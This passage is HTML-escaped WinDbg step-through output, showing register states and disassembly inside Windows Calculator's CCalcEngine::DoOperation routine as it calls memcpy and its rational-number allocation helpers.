ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5a7:&lt;br /&gt;004913bd ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:0037554c=003770f0&lt;br /&gt;eax=00375548 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913c0 esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5aa:&lt;br /&gt;004913c0 e8b60cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!memcpy (0047207b)&lt;br /&gt;eax=003770f0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913c5 esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5af:&lt;br /&gt;004913c5 83c40c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; esp,0Ch&lt;br /&gt;eax=003770f0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913c8 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000216&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5b2:&lt;br /&gt;004913c8 ff36&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=003770f0 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913ca esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz ac pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000216&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5b4:&lt;br /&gt;004913ca e8d60cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_destroyrat (004720a5)&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=75f376dc edx=00360174 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913cf esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5b9:&lt;br /&gt;004913cf 893e&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi],edi&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=75f376dc edx=00360174 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913d1 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5bb:&lt;br /&gt;004913d1 e8b00cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_createrat (00472086)&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913d6 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5c0:&lt;br /&gt;004913d6 8906&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi],eax&amp;nbsp; ds:0023:006cc420=00000000&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913d8 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5c2:&lt;br /&gt;004913d8 ff30&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:00379df0=00000000&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913da esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5c4:&lt;br /&gt;004913da e8fa0cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_destroynum (004720d9)&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913df esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5c9:&lt;br /&gt;004913df 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913e1 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5cb:&lt;br /&gt;004913e1 2138&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; and&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax],edi&amp;nbsp; ds:0023:00379df0=00000000&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=004913e3 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5cd:&lt;br /&gt;004913e3 8b7d10&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,dword ptr [ebp+10h] ss:0023:0020e398=0038ffa0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913e6 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5d0:&lt;br /&gt;004913e6 8b07&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [edi]&amp;nbsp; ds:0023:0038ffa0=0037a1f0&lt;br /&gt;eax=0037a1f0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913e8 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5d2:&lt;br /&gt;004913e8 ff7004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax+4]&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:0037a1f4=00000001&lt;br /&gt;eax=0037a1f0 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913eb esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5d5:&lt;br /&gt;004913eb e8040dfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_createnum (004720f4)&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=75f37782 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913f0 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5da:&lt;br /&gt;004913f0 8b0e&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913f2 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5dc:&lt;br /&gt;004913f2 8901&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ecx],eax&amp;nbsp; ds:0023:00379df0=00000000&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913f4 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5de:&lt;br /&gt;004913f4 8b07&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [edi]&amp;nbsp; ds:0023:0038ffa0=0037a1f0&lt;br /&gt;eax=0037a1f0 ebx=006cc278 ecx=00379df0 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913f6 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5e0:&lt;br /&gt;004913f6 8b4804&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,dword ptr [eax+4] ds:0023:0037a1f4=00000001&lt;br /&gt;eax=0037a1f0 ebx=006cc278 ecx=00000001 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=004913f9 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5e3:&lt;br /&gt;004913f9 8d0c8d0c000000&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[ecx*4+0Ch]&lt;br /&gt;eax=0037a1f0 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491400 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5ea:&lt;br /&gt;00491400 51&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx&lt;br /&gt;eax=0037a1f0 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491401 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5eb:&lt;br /&gt;00491401 50&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&lt;br /&gt;eax=0037a1f0 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491402 esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5ec:&lt;br /&gt;00491402 8b06&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [esi]&amp;nbsp; ds:0023:006cc420=00379df0&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491404 esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5ee:&lt;br /&gt;00491404 ff30&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [eax]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ds:0023:00379df0=00379d90&lt;br /&gt;eax=00379df0 ebx=006cc278 ecx=00000010 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=00491406 esp=0020e344 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x5f0:&lt;br /&gt;00491406 e8700cfeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!memcpy (0047207b)&lt;br /&gt;eax=00379d90 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=0038ffa0&lt;br /&gt;eip=0049140b esp=0020e344 ebp=0020e388 